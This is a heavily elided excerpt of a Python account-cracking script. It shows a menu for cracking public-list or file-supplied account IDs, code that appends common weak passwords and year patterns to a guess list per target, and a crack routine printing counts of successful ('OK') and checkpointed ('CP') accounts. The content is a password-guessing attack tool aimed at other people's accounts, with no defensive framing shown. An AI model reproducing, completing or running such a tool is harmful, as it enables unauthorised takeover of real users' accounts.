...
def main():
    ...
    gh = 'h'
    print(f'''{H} [1] - Crack Publik''')
    print(f'''{H} [2] - Crack File''')
    print(f'''{H} [0] - login''')
        ...
        for yuzong in id2:
            ...
            if len(nmf) < 6:
                if len(frs) < 3:
                    ...
                    pwv.append('Aa123456')
                    pwv.append('19981998a')
                    pwv.append('19991999a')
                    pwv.append('199a199a')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
...
def crack(idf, pwv):
    ...
    fff = '%'
    print('\r%s [ President  ] %s/%s - OK : %s - CP : %s - %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
